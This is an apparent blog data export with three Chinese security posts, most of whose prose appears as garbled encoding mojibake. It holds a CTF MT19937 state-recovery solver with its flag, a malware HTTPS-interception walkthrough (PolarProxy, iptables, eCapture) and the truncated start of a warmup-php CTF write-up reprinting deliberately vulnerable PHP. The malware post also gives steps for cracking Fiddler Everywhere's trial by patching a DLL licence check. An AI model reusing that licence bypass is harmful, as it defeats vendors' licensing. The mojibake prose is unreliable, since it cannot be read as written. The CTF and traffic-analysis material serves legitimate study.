æ‰€ä»¥æˆ‘ä»¬ç”¨ç»™å‡ºçš„624ä¸ªéšæœºæ•°é€†æ¨å‡ºåˆ—è¡¨MTçš„çŠ¶æ€ï¼Œå†è°ƒç”¨ä¸€ä¸‹å‡½æ•°generate(self)ï¼Œæœ€ååœ¨ç”Ÿæˆä¸€ä¸ªéšæœºæ•°å³å¯è·å¾—flag æ­¤é¢˜çš„éš¾ç‚¹åœ¨äºè¿™ä¸¤æ¡è¯­å¥çš„é€†ç®—æ³• 12y = y ^ self.cs2l(y, 11) ^ self.cs2l(y, 15)y = y ^ self.cs2r(y, 7) ^ self.cs2r(y, 19) å…ˆçœ‹ç¬¬ä¸€æ¡è¯­å¥ï¼Œäº§ç”Ÿçš„ç»“æœç­‰ä»·å¦‚ä¸‹æ–¹ç¨‹ç»„ {a0=b0âŠ•b11âŠ•b15a1=b1âŠ•b12âŠ•b16a2=b2âŠ•b13âŠ•b17a3=b3âŠ•b14âŠ•b18a4=b4âŠ•b15âŠ•b19a5=b5âŠ•b16âŠ•b20a6=b6âŠ•b17âŠ•b21a7=b7âŠ•b18âŠ•b22a8=b8âŠ•b19âŠ•b23a9=b9âŠ•b20âŠ•b24a10=b10âŠ•b21âŠ•b25a11=b11âŠ•b22âŠ•b26a12=b12âŠ•b23âŠ•b27a13=b13âŠ•b24âŠ•b28a14=b14âŠ•b25âŠ•b29a15=b15âŠ•b26âŠ•b30a16=b16âŠ•b27âŠ•b31a17=b17âŠ•b28âŠ•b0a18=b18âŠ•b29âŠ•b1a19=b19âŠ•b30âŠ•b2a20=b20âŠ•b31âŠ•b3a21=b21âŠ•b0âŠ•b4a22=b22âŠ•b1âŠ•b5a23=b23âŠ•b2âŠ•b6a24=b24âŠ•b3âŠ•b7a25=b25âŠ•b4âŠ•b8a26=b26âŠ•b5âŠ•b9a27=b27âŠ•b6âŠ•b10a28=b28âŠ•b7âŠ•b11a29=b29âŠ•b8âŠ•b12a30=b30âŠ•b9âŠ•b13a31=b31âŠ•b10âŠ•b14\\begin{cases} a_{0} = b_{0} \\oplus b_{11} \\oplus b_{15} \\\\ a_{1} = b_{1} \\oplus b_{12} \\oplus b_{16} \\\\ a_{2} = b_{2} \\oplus b_{13} \\oplus b_{17} \\\\ a_{3} = b_{3} \\oplus b_{14} \\oplus b_{18} \\\\ a_{4} = b_{4} \\oplus b_{15} \\oplus b_{19} \\\\ a_{5} = b_{5} \\oplus b_{16} \\oplus b_{20} \\\\ a_{6} = b_{6} \\oplus b_{17} \\oplus b_{21} \\\\ a_{7} = b_{7} \\oplus b_{18} \\oplus b_{22} \\\\ a_{8} = b_{8} \\oplus b_{19} \\oplus b_{23} \\\\ a_{9} = b_{9} \\oplus b_{20} \\oplus b_{24} \\\\ a_{10} = b_{10} \\oplus b_{21} \\oplus b_{25} \\\\ a_{11} = b_{11} \\oplus b_{22} \\oplus b_{26} \\\\ a_{12} = b_{12} \\oplus b_{23} \\oplus b_{27} \\\\ a_{13} = b_{13} \\oplus b_{24} \\oplus b_{28} \\\\ a_{14} = b_{14} \\oplus b_{25} \\oplus b_{29} \\\\ a_{15} = b_{15} \\oplus b_{26} \\oplus b_{30} \\\\ a_{16} = b_{16} \\oplus b_{27} \\oplus b_{31} \\\\ a_{17} = b_{17} \\oplus b_{28} \\oplus b_{0} \\\\ a_{18} = b_{18} \\oplus b_{29} \\oplus b_{1} \\\\ a_{19} = b_{19} \\oplus b_{30} \\oplus b_{2} \\\\ a_{20} = b_{20} \\oplus b_{31} \\oplus b_{3} \\\\ a_{21} = b_{21} \\oplus b_{0} \\oplus b_{4} \\\\ a_{22} = b_{22} \\oplus b_{1} \\oplus b_{5} \\\\ a_{23} = b_{23} \\oplus b_{2} \\oplus b_{6} \\\\ a_{24} = b_{24} \\oplus b_{3} \\oplus b_{7} \\\\ a_{25} = b_{25} \\oplus b_{4} \\oplus b_{8} \\\\ a_{26} = b_{26} \\oplus b_{5} \\oplus b_{9} \\\\ a_{27} = b_{27} \\oplus b_{6} \\oplus b_{10} \\\\ a_{28} = b_{28} \\oplus b_{7} \\oplus b_{11} \\\\ a_{29} = b_{29} \\oplus b_{8} \\oplus b_{12} \\\\ a_{30} = b_{30} \\oplus b_{9} \\oplus b_{13} \\\\ a_{31} = b_{31} \\oplus b_{10} \\oplus b_{14} \\end{cases}â©âªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâ¨âªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâªâ§â€‹a0â€‹=b0â€‹âŠ•b11â€‹âŠ•b15â€‹a1â€‹=b1â€‹âŠ•b12â€‹âŠ•b16â€‹a2â€‹=b2â€‹âŠ•b13â€‹âŠ•b17â€‹a3â€‹=b3â€‹âŠ•b14â€‹âŠ•b18â€‹a4â€‹=b4â€‹âŠ•b15â€‹âŠ•b19â€‹a5â€‹=b5â€‹âŠ•b16â€‹âŠ•b20â€‹a6â€‹=b6â€‹âŠ•b17â€‹âŠ•b21â€‹a7â€‹=b7â€‹âŠ•b18â€‹âŠ•b22â€‹a8â€‹=b8â€‹âŠ•b19â€‹âŠ•b23â€‹a9â€‹=b9â€‹âŠ•b20â€‹âŠ•b24â€‹a10â€‹=b10â€‹âŠ•b21â€‹âŠ•b25â€‹a11â€‹=b11â€‹âŠ•b22â€‹âŠ•b26â€‹a12â€‹=b12â€‹âŠ•b23â€‹âŠ•b27â€‹a13â€‹=b13â€‹âŠ•b24â€‹âŠ•b28â€‹a14â€‹=b14â€‹âŠ•b25â€‹âŠ•b29â€‹a15â€‹=b15â€‹âŠ•b26â€‹âŠ•b30â€‹a16â€‹=b16â€‹âŠ•b27â€‹âŠ•b31â€‹a17â€‹=b17â€‹âŠ•b28â€‹âŠ•b0â€‹a18â€‹=b18â€‹âŠ•b29â€‹âŠ•b1â€‹a19â€‹=b19â€‹âŠ•b30â€‹âŠ•b2â€‹a20â€‹=b20â€‹âŠ•b31â€‹âŠ•b3â€‹a21â€‹=b21â€‹âŠ•b0â€‹âŠ•b4â€‹a22â€‹=b22â€‹âŠ•b1â€‹âŠ•b5â€‹a23â€‹=b23â€‹âŠ•b2â€‹âŠ•b6â€‹a24â€‹=b24â€‹âŠ•b3â€‹âŠ•b7â€‹a25â€‹=b25â€‹âŠ•b4â€‹âŠ•b8â€‹a26â€‹=b26â€‹âŠ•b5â€‹âŠ•b9â€‹a27â€‹=b27â€‹âŠ•b6â€‹âŠ•b10â€‹a28â€‹=b28â€‹âŠ•b7â€‹âŠ•b11â€‹a29â€‹=b29â€‹âŠ•b8â€‹âŠ•b12â€‹a30â€‹=b30â€‹âŠ•b9â€‹âŠ•b13â€‹a31â€‹=b31â€‹âŠ•b10â€‹âŠ•b14â€‹â€‹ å…¶ä¸­aaaï¼Œbbbä»£è¡¨32ä½bit å·²çŸ¥aaaï¼Œæ±‚bbb ä½¿a0=a0âŠ•a11âŠ•a15a_{0} = a_{0} \\oplus a_{11} \\oplus a_{15}a0â€‹=a0â€‹âŠ•a11â€‹âŠ•a15â€‹ï¼Œä½™ä¸‹çš„å¼å­æ¨¡32é€’å¢ä¸‹æ ‡ å¯å¾— a0=b0âŠ•b22âŠ•b30a_{0} = b_{0} \\oplus b_{22} \\oplus b_{30}a0â€‹=b0â€‹âŠ•b22â€‹âŠ•b30â€‹ ......... é‡å¤ä¸Šè¿°æ“ä½œå¾—åˆ° a0=b0âŠ•b12âŠ•b18a_{0} = b_{0} \\oplus b_{12} \\oplus b_{18}a0â€‹=b0â€‹âŠ•b12â€‹âŠ•b18â€‹ äºæ˜¯æˆ‘çŒœæƒ³å¯èƒ½åœ¨è¿›è¡Œè¶³å¤Ÿå¤šæ¬¡çš„è¿­ä»£è¿ç®—åå¾—åˆ°çš„ç»“æœæ˜¯ a0=b0âŠ•b0âŠ•b0a_{0} = b_{0} \\oplus b_{0} \\oplus b_{0}a0â€‹=b0â€‹âŠ•b0â€‹âŠ•b0â€‹ å³a0=b0a_{0} = b_{0}a0â€‹=b0â€‹ ç¼–å†™è„šæœ¬éªŒè¯æƒ³æ³• 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162equ = [[0, 11, 15],[1, 12, 16],[2, 13, 17],[3, 14, 18],[4, 15, 19],[5, 16, 20],[6, 17, 21],[7, 18, 22],[8, 19, 23],[9, 20, 24],[10, 21, 25],[11, 22, 26],[12, 23, 27],[13, 24, 28],[14, 25, 29],[15, 26, 30],[16, 27, 31],[17, 28, 0],[18, 29, 1],[19, 30, 2],[20, 31, 3],[21, 0, 4],[22, 1, 5],[23, 2, 6],[24, 3, 7],[25, 4, 8],[26, 5, 9],[27, 6, 10],[28, 7, 11],[29, 8, 12],[30, 9, 13],[31, 10, 14]]import copydef self_xor(number1, number2): new_equ = [] length = len(equ) for _ in range(length): equ1 = [x for x in equ[_]] equ2 = [x for x in equ[(_ + number1)%length]] equ3 = [x for x in equ[(_ + number2)%length]] for __ in equ2: if __ in equ1: equ1.pop(equ1.index(__)) else: equ1.append(__) for __ in equ3: if __ in equ1: equ1.pop(equ1.index(__)) else: equ1.append(__) new_equ.append(equ1) return new_equequ = self_xor(25, 13)equ = self_xor(18, 26)equ = self_xor(4, 20)for _ in equ: print(_) æœ€åçš„è¾“å‡ºç»“æœå¯ä»¥éªŒè¯æƒ³æ³•æ­£ç¡®ï¼Œä¸”è·å¾—äº†è¿­ä»£å¼‚æˆ–è¿ç®—çš„shitfå€¼ ç¬¬äºŒæ¡è¯­å¥çš„é€†å‘ç®—æ³•åŒç† 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253def bits_xor(bits, shift1, shift2): old_bits = bits length = len(bits) new_bits = &quot;&quot; for _ in range(length): new_bits = new_bits + str(int(old_bits[_]) ^ int(old_bits[(_+shift1)%length]) ^ int(old_bits[(_+shift2)%length])) return new_bitsdef cs2l(y, shift): return ((y &lt;&lt; shift) ^ (y &gt;&gt; (32 - shift))) &amp; 0xffffffff def cs2r(y, shift): return ((y &gt;&gt; shift) ^ (y &lt;&lt; (32 - shift))) &amp; 0xffffffffdef reverse_cs2l(y): bits = bin(y)[2:] bit_len = len(bits) bits32 = &quot;0&quot; * (32 - bit_len) + bits bits32 = bits_xor(bits32, 11, 15) bits32 = bits_xor(bits32, 22, 30) bits32 = bits_xor(bits32, 12, 28) number = int(bits32, 2) return numberdef reverse_cs2r(y): bits = bin(y)[2:] bit_len = len(bits) bits32 = &quot;0&quot; * (32 - bit_len) + bits bits32 = bits_xor(bits32, 25, 13) bits32 = bits_xor(bits32, 18, 26) bits32 = bits_xor(bits32, 4, 20) number = int(bits32, 2) return numberf = open(&quot;./output.txt&quot;, &quot;r&quot;)data = f.read().split(&quot;, &quot;)f.close()MT = []for _ in data: MT.append(reverse_cs2l(reverse_cs2r(int(_))))for i in range(624): y = (MT[i] &amp; 0x80000000) + (MT[(i+1)%624] &amp; 0x7fffffff) MT[i] = MT[(i+397)%624] ^ (y &gt;&gt; 1) if y &amp; 1: MT[i] ^= 2567483520y = MT[0]y = y ^ cs2l(y, 11) ^ cs2l(y, 15)y = y ^ cs2r(y, 7) ^ cs2r(y, 19)from hashlib import md5flag = &#x27;DASCTF&#123;&#x27; + md5(str(y).encode()).hexdigest() + &#x27;&#125;&#x27;print(flag) 1DASCTF&#123;49e225e5b1b57a1d3c9803b5ddfd38f9&#125; åé¢ä¸¤é¢˜éšç¼˜æ›´æ–° æ›´ä¸ªé”¤å­ï¼ŒCrypto2 3æƒ³ç ´å¤´éƒ½æ²¡æ€è·¯","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"MT19937","slug":"MT19937","permalink":"https://yoloyolo.top/tags/MT19937/"}]},{"title":"æ¶æ„ç¨‹åºHTTPSè§£å¯†","slug":"Malware-HTTPS-Decryption","date":"2022-05-14T23:54:29.000Z","updated":"2022-06-10T17:44:30.000Z","comments":true,"path":"2022/05/14/Malware-HTTPS-Decryption/","link":"","permalink":"https://yoloyolo.top/2022/05/14/Malware-HTTPS-Decryption/","excerpt":"è·ç¦»çœè€ƒå®£å¸ƒå¯„äº†å·²ç»è¿‡å»äº†ä¸¤ä¸ªæœˆäº† äºæ˜¯æ‰“äº†ä¸¤ä¸ªæœˆçš„æ¸¸æˆï¼Œå±å®æ˜¯æ‰“åäº† å‡ºæ¥å»åŸæ¥çš„å•ä½å®ä¹  ä¸Šæ¥å°±æ˜¯åˆ†æç—…æ¯’ åœ¨æ‘¸ç´¢çš„è¿‡ç¨‹ä¸­äº§ç”Ÿäº†è¿™ç¯‡æ–‡ç« ","text":"è·ç¦»çœè€ƒå®£å¸ƒå¯„äº†å·²ç»è¿‡å»äº†ä¸¤ä¸ªæœˆäº† äºæ˜¯æ‰“äº†ä¸¤ä¸ªæœˆçš„æ¸¸æˆï¼Œå±å®æ˜¯æ‰“åäº† å‡ºæ¥å»åŸæ¥çš„å•ä½å®ä¹  ä¸Šæ¥å°±æ˜¯åˆ†æç—…æ¯’ åœ¨æ‘¸ç´¢çš„è¿‡ç¨‹ä¸­äº§ç”Ÿäº†è¿™ç¯‡æ–‡ç«  0x00 Wireshark å°è¯•æŠ“åŒ…æ¶æ„è½¯ä»¶ å¼€å¯Wiresharkï¼Œè¿è¡Œæ¶æ„ç¨‹åºï¼Œå…¨æ˜¯HTTPSçš„æ•°æ® çœ‹äº†ä¸‹ç½‘ä¸Šçš„èµ„æ–™å¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡$SSLKEYLOGFILEæ¥è®¾ç½®SSLå¯†é’¥ä¸´æ—¶æ–‡ä»¶çš„ä½ç½®ï¼Œç„¶ååœ¨Wiresharké‡Œå¯¼å…¥ 1export SSLKEYLOGFILE=/tmp/tls.log Editâ†’ Preferences â†’ Protocols â†’ TLS â†’ (Pre-)Master-Secret log filename é€‰æ‹©ç¯å¢ƒå˜é‡$SSLKEYLOGFILEçš„å†…å®¹ 1curl https://www.baidu.com/ å³å¯$SSLKEYLOGFILEä¸­çœ‹åˆ°HTTPSçš„å¯†é’¥ Wiresharkä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°è§£å¯†çš„HTTPSæµé‡ ä½†æ˜¯è¿è¡Œæ¶æ„ç¨‹åºï¼Œæ¶æ„ç¨‹åºå‘èµ·çš„HTTPSè¯·æ±‚åå¹¶ä¸ä¼šåœ¨$SSLKEYLOGFILEå†™å…¥å¯†é’¥ æ‰€ä»¥è¿™ä¸ªæ–¹æ³•è¡Œä¸é€š æœ‰æƒ³åˆ°è¿‡è‡ªå·±çœ‹TLSçš„å¯†é’¥åå•†è¿‡ç¨‹ï¼Œå†™ä¸ªè„šæœ¬æ¥è®¡ç®—å‡ºMaster Secret Keyï¼Œç„¶åå¯¼å…¥Wiresharkæ¥è§£å¯†å·²ä¿å­˜çš„æµé‡ï¼Œä½†æ°´å¹³æœ‰é™å†™ä¸å‡ºæ¥ å¥½å§ï¼Œæ­£å¸¸æƒ…å†µ 0x01 Burpsuite å°†Burpsuiteè¯ä¹¦è®¾ç½®ä¸ºç³»ç»Ÿè¯ä¹¦ï¼ˆä¸è¿™ç¯‡æ–‡ç« ç±»ä¼¼ï¼‰ 12345burpsuite&amp;curl -O http://127.0.0.1:8080/certopenssl x509 -inform DER -in cert -out burp.crtmv burp.crt /usr/local/share/ca-certificates/update-ca-certificates è®¾ç½®ç³»ç»Ÿä»£ç† 12export http_proxy=&quot;http://127.0.0.1:8080/&quot;export https_proxy=&quot;http://127.0.0.1:8080/&quot; å‘½ä»¤è¡Œé‡Œçš„curlå’Œpythonéƒ½èƒ½è¢«æŠ“åˆ°httpsçš„æ•°æ®åŒ… ä½†æ˜¯æ¶æ„è½¯ä»¶çš„æµé‡æŠ“ä¸åˆ° ä½¿ç”¨proxychainsä»£ç† 123apt-get install proxychainsecho &quot;http 127.0.0.1 8080&quot; &gt;&gt; /etc/proxychains.confproxychain ./fritzfrog (é…ç½®æ–‡ä»¶/etc/proxychains.confå¥½åƒé»˜è®¤æœ‰ä¸€ä¸ªsocks4çš„ä»£ç†ï¼Ÿè‡ªå·±çœ‹ç€åˆ æ‰å§) ä½†æ˜¯æ¶æ„è½¯ä»¶çš„æµé‡è¿˜æ˜¯æŠ“ä¸åˆ° å¤§æ¦‚æ˜¯è¿™ä¸ªæ¶æ„ç¨‹åºè®¾ç½®çš„æ˜¯ä¸èµ°ç³»ç»Ÿçš„ä»£ç†å§ï¼Œåªèƒ½è¯´å¼€å‘äººå‘˜æœ‰ç‚¹æ°´å¹³ 0x02 Fiddler Everywhere æƒ³ç€åœ¨Fiddlerä¸ŠæŠ“ä¸€ä¸‹å…¨å±€æµé‡ï¼Œç»“æœFiddler4åœ¨linuxä¸Šé¢ç”¨ä¸äº†ï¼Œåªèƒ½ç”¨monoè¿è¡Œä¸€ä¸ªè€ç‰ˆæœ¬ è¿˜æ˜¯ç”¨Fidder Everywhereå§ 123wget https://downloads.getfiddler.com/linux/fiddler-everywhere-3.2.0.AppImagechmod +x fiddler-everywhere-3.2.0.AppImage./fiddler-everywhere-3.2.0.AppImage æ³¨å†Œï¼Œç™»å½•ï¼Œâ€œYour 30-day free trial has expired!â€ çœ‹æ¥æ˜¯å¾—ç ´è§£ä¸€ä¸‹äº† AppImageæ ¼å¼æ“ä½œè¯´æ˜ ç½‘ä¸Šé€›é€›æ‰¾åˆ°äº†ä¸ªè¡¥ä¸ è¡¥ä¸ä¸‹è½½ 1fiddler-everywhere-3.2.0.AppImage --appimage-extract Fiddler.WebUi.dllåœ¨./squashfs-root/resources/app/out/WebServer/ main.3f983221e4e1aade.jsåœ¨./squashfs-root/resources/app/out/WebServer/ClientApp/dist/ æ›¿æ¢å®Œæˆåè¿›è¡Œæ‰“åŒ… 123456wget https://github.com/AppImage/AppImageKit/releases/download/13/appimagetool-x86_64.AppImagemv appimagetool-x86_64.AppImage appimagetoolchmod +x appiamgetoolmv appimagetool /usr/local/bin/ARCH=x86_64 appimagetool squashfs-root/./Fiddler_Everywhere-x86_64.AppImage å¡åœ¨&quot;Please Wait&quot;ç•Œé¢ï¼Œå¯„ æ ¹æ®è¿™ç¯‡åšå®¢[Linux]ç ´è§£æŠ“åŒ…è½¯ä»¶FiddlerEverywhere 3.2.0 crackedç”¨dnspyæ”¹FiddlerBackendSDK.dllæ–‡ä»¶ 123456789101112131415//rawpublic AccountDTO GetBestAccount(UserWithBestAccountDTO user)&#123; if (user.BestEverywhereAccountId != null) &#123; return Enumerable.FirstOrDefault&lt;UserAccountDTO&gt;(user.Accounts, (UserAccountDTO x) =&gt; x.Id == user.BestEverywhereAccountId.Value); &#125; return null;&#125;//modifiedpublic AccountDTO GetBestAccount(UserWithBestAccountDTO user)&#123; return Enumerable.FirstOrDefault&lt;UserAccountDTO&gt;(user.Accounts, (UserAccountDTO x) =&gt; true);&#125; æ”¹æˆè¿™æ ·é‡æ‰“åŒ…dllï¼Œæ›¿æ¢åŸdllåé‡æ‰“åŒ…appimage è¿è¡Œåè¿˜æ˜¯å¡åœ¨&quot;Please Wait&quot;ç•Œé¢ï¼Œå¯„ æµªè´¹äº†å¤§åŠå¤©çš„æ—¶é—´æ··äº†å¤§åŠå¤© 0x03 Polarproxy ä¹‹å‰æƒ³ç€æ¶æ„ç¨‹åºæ—¢ç„¶èƒ½å¤Ÿç»•è¿‡ç³»ç»Ÿä»£ç†ï¼Œé‚£æˆ‘æŠŠç½‘å¡çš„æµé‡ç”¨iptablesæ•´ä¸ªé‡å®šå‘åˆ°Burpsuiteä¸å°±è¡Œäº† ä½†æ˜¯å®é™…ä¸Šè¿˜æ˜¯ä¸è¡Œï¼Œè‡ªå·±å¤§æ¦‚æ€è€ƒäº†ä¸€ä¸‹ï¼Œè¿™ç©æ„ä¼°è®¡æŠŠTCPæ¡æ‰‹çš„æµé‡ä¹Ÿä¸¢ç»™Burpsuiteäº†ï¼ŒBurpsuiteä¼°è®¡æ˜¯å¤„ç†ä¸äº†TCPæµé‡ï¼Œç„¶åå°±å¯„äº†ï¼ˆæœªéªŒè¯ï¼‰ æ··äº†å¤§åŠå¤©ï¼Œçªç„¶è„‘å­æœ‰ä¸ªæƒ³æ³•ï¼Œgoogleä¸Šæœäº†ä¸€ä¸‹&quot;how to decrypt malware https traffic&quot; ç„¶åç¬¬ä¸€ä¸ªç»“æœå°±ä»‹ç»äº†PolarProxyè¿™ä¸ªå·¥å…·ï¼Œå»å®˜ç½‘çœ‹äº†ä¸€ä¸‹ 1PolarProxy is a transparent SSL&#x2F;TLS proxy created for incident responders and malware researchers. PolarProxy is primarily designed to intercept and decrypt TLS encrypted traffic from malware. PolarProxy decrypts and re-encrypts TLS traffic, while also saving the decrypted traffic in a PCAP file that can be loaded into Wireshark or an intrusion detection system (IDS). çœ‹æ¥è‡ªå·±æ˜¯æ‰¾å¯¹ä¸œè¥¿äº† è¿™ç©æ„å¾—å•ç‹¬ç”¨ä¸ªç”¨æˆ·è¿è¡Œï¼Œä¸ç„¶åˆ°æ—¶å€™iptablesé‡å®šå‘ä¼šè·Ÿè¿™ç©æ„æ•´ä¸ªæ­»å¾ªç¯å‡ºæ¥ å®‰è£…å¹¶å¯ç”¨ 123456789101112sudo adduser --system --shell /bin/bash proxyusersudo mkdir /var/log/PolarProxysudo chown proxyuser:root /var/log/PolarProxy/sudo chmod 0775 /var/log/PolarProxy/sudo su - proxyusermkdir ~/PolarProxycd ~/PolarProxy/curl https://www.netresec.com/?download=PolarProxy | tar -xzf -exitsudo cp /home/proxyuser/PolarProxy/PolarProxy.service /etc/systemd/system/PolarProxy.servicesudo systemctl enable PolarProxy.servicesudo systemctl start PolarProxy.service é…ç½®ç³»ç»Ÿè¯ä¹¦ 123sudo mkdir /usr/share/ca-certificates/extrasudo openssl x509 -inform DER -in /var/log/PolarProxy/polarproxy.cer -out /usr/share/ca-certificates/extra/PolarProxy-root-CA.crtsudo dpkg-reconfigure ca-certificates å¯ç”¨extra /PolarProxy-root-CA.crtå³å¯ é…ç½®iptables 12iptables -t nat -A OUTPUT -m owner --uid 0 -p tcp --dport 443 -j REDIRECT --to 10443iptables -t nat -A OUTPUT -m owner --uid 1000 -p tcp --dport 443 -j REDIRECT --to 10443 è¿è¡Œæ¶æ„ç¨‹åºååœ¨ç›®å½•/var/log/PolarProxy/ä¸­å¯ä»¥çœ‹åˆ°ç¨‹åºæ•è·å¹¶è§£å¯†çš„HTTPSæµé‡ ä½¿ç”¨wiresharkæ‰“å¼€å³å¯ æ™®é€šç”¨æˆ·è¿è¡Œæ¶æ„ç¨‹åºæ²¡å•¥ååº”ï¼Œç”¨rootè¿è¡Œæ‰æŠ“åˆ°åŒ… é¡ºå¸¦ä¸€æï¼Œè¿™ä¸ªç¨‹åºé»˜è®¤æ¯å¤©è§£å¯†10GBçš„HTTPSçš„æµé‡æˆ–10000æ¬¡SESSIONï¼Œä½†æ˜¯å¤Ÿç”¨äº† 0x04 ecapture https://github.com/ehids/ecapture çœ‹ebpf rootkitçš„æ—¶å€™çœ‹åˆ°äº†ä¸€ä¸ªåŸºäºebpfçš„monitor èƒ½æ£€æµ‹bashå’Œè§£å¯†https è§£å¯†çš„å¤§æ¦‚æ€è·¯æ˜¯hookä¸€äº›sslåº“ï¼Œå¯¹äºtlså±‚å¯ä»¥ç›´æ¥è·å–httpè¯·æ±‚ä¸å“åº” ä¹Ÿå°±æ„å‘³ç€è¿™ç©æ„ç”šè‡³èƒ½å…é™¤ç”¨äºMITMçš„CA ä½†æ˜¯ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ 12ldd .&#x2F;apache2 not a dynamic executable","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Reverse","slug":"Reverse","permalink":"https://yoloyolo.top/tags/Reverse/"},{"name":"HTTPS","slug":"HTTPS","permalink":"https://yoloyolo.top/tags/HTTPS/"},{"name":"Traffic_Analysis","slug":"Traffic-Analysis","permalink":"https://yoloyolo.top/tags/Traffic-Analysis/"},{"name":"Malware","slug":"Malware","permalink":"https://yoloyolo.top/tags/Malware/"}]},{"title":"DASCTF_APR_2022","slug":"DASCTF-APR-2022","date":"2022-04-24T05:52:50.000Z","updated":"2022-04-25T08:01:35.000Z","comments":true,"path":"2022/04/24/DASCTF-APR-2022/","link":"","permalink":"https://yoloyolo.top/2022/04/24/DASCTF-APR-2022/","excerpt":"æœ¬æ¥æ°å®ŒKFCæ™šé¤å‡†å¤‡å›å¯å®¤æ‰“æ¸¸æˆæ¥ç€ï¼Œè·¯ä¸Šè¢«é˜Ÿå‹å–Šå»åšWEBäº† è¯´æ˜¯ä»Šå¤©BUUOJä¸Šçš„æ¯”èµ›ï¼Œä½†æ˜¯å·²ç»æ‰“å®Œäº†ï¼Œåšä¸¤é¢˜ç©ç© ä½†æ˜¯æˆ‘ä¸Šä¸€æ¬¡ç¢°CTFè¿˜æ˜¯å»å¹´çš„çœèµ›â€¦","text":"æœ¬æ¥æ°å®ŒKFCæ™šé¤å‡†å¤‡å›å¯å®¤æ‰“æ¸¸æˆæ¥ç€ï¼Œè·¯ä¸Šè¢«é˜Ÿå‹å–Šå»åšWEBäº† è¯´æ˜¯ä»Šå¤©BUUOJä¸Šçš„æ¯”èµ›ï¼Œä½†æ˜¯å·²ç»æ‰“å®Œäº†ï¼Œåšä¸¤é¢˜ç©ç© ä½†æ˜¯æˆ‘ä¸Šä¸€æ¬¡ç¢°CTFè¿˜æ˜¯å»å¹´çš„çœèµ›â€¦ warmup-php 123456789101112131415161718192021&lt;?phpspl_autoload_register(function($class)&#123; require(&quot;./class/&quot;.$class.&quot;.php&quot;);&#125;);highlight_file(__FILE__);error_reporting(0);$action = $_GET[&#x27;action&#x27;];$properties = $_POST[&#x27;properties&#x27;];class Action&#123; public function __construct($action,$properties)&#123; $object=new $action(); foreach($properties as $name=&gt;$value) $object-&gt;$name=$value; $object-&gt;run(); &#125;&#125;new Action($action,$properties);?&gt; å‚æ•°actionç”¨äºè¾“å…¥ç±»å å‚æ•°propertiesç”¨äºè¾“å…¥å¯¹è±¡çš„å±æ€§ å®Œäº‹åä¼šæ‰§è¡Œ$object-&gt;run() å‡½æ•°run()åœ¨ListView.phpä¸­ 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpabstract class ListView extends Base&#123; public $tagName=&#x27;div&#x27;; public $template; public function run() &#123; echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\\n&quot;; $this-&gt;renderContent(); echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\\n&quot;; &#125; public function renderContent() &#123; ob_start(); echo preg_replace_callback(&quot;/&#123;(\\w+)&#125;/&quot;,array($this,&#x27;renderSection&#x27;),$this-&gt;template); ob_end_flush(); &#125; protected function renderSection($matches) &#123; $method=&#x27;render&#x27;.$matches[1]; if(method_exists($this,$method)) &#123; $this-&gt;$method(); $html=ob_get_contents(); ob_clean(); return $html; &#125; else return $matches[0]; &#125;&#125; run() -&gt; renderContent() -&gt; renderSection() å…¶ä¸­å‡½æ•°renderSection()ä¸ºå‡½æ•°renderContent()ä¸­æ­£åˆ™åŒ¹é…æ›¿æ¢çš„å›è°ƒå‡½æ•° ç”¨äºåŒ¹é…&#123;\\w+&#125;çš„å­—ç¬¦ä¸²ï¼Œå¹¶å°†\\w+æ‹¼æ¥åˆ°&quot;render&quot;ä¹‹åï¼Œå†æ£€éªŒç±»ä¸­æ˜¯å¦æœ‰è¿™ä¸ªå‡½æ•°ï¼Œå¦‚æœæœ‰åˆ™æ‰§è¡Œï¼Œæ²¡æœ‰åˆ™è¾“å‡º&#123;\\w+&#125; å†çœ‹TestView.phpçš„å†…å®¹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748public function renderTableRow($row)&#123; $htmlOptions=array(); if($this-&gt;rowHtmlOptionsExpression!==null) &#123; $data=$this-&gt;data[$row]; $options=$this-&gt;evaluateExpression($this-&gt;rowHtmlOptionsExpression,array(&#x27;row&#x27;=&gt;$row,&#x27;data&#x27;=&gt;$data)); if(is_array($options)) $htmlOptions = $options; &#125; if($this-&gt;rowCssClassExpression!==null) &#123; $data=$this-&gt;dataProvider-&gt;data[$row]; $class=$this-&gt;evaluateExpression($this-&gt;rowCssClassExpression,array(&#x27;row&#x27;=&gt;$row,&#x27;data&#x27;=&gt;$data)); &#125; elseif(is_array($this-&gt;rowCssClass) &amp;&amp; ($n=count($this-&gt;rowCssClass))&gt;0) $class=$this-&gt;rowCssClass[$row%$n]; if(!empty($class)) &#123; if(isset($htmlOptions[&#x27;class&#x27;])) $htmlOptions[&#x27;class&#x27;].=&#x27; &#x27;.$class; else $htmlOptions[&#x27;class&#x27;]=$class; &#125;&#125;public function renderTableBody()&#123; $data=$this-&gt;data; $n=count($data); echo &quot;&lt;hr /&gt;&quot;.$n.&quot;&lt;hr /&gt;&quot;; echo &quot;&lt;tbody&gt;\\n&quot;; if($n&gt;0) &#123; for($row=0;$row&lt;$n;++$row) $this-&gt;renderTableRow($row); &#125; else &#123; echo &#x27;&lt;tr&gt;&lt;td colspan=&quot;&#x27;.count($this-&gt;columns).&#x27;&quot; class=&quot;empty&quot;&gt;&#x27;; echo 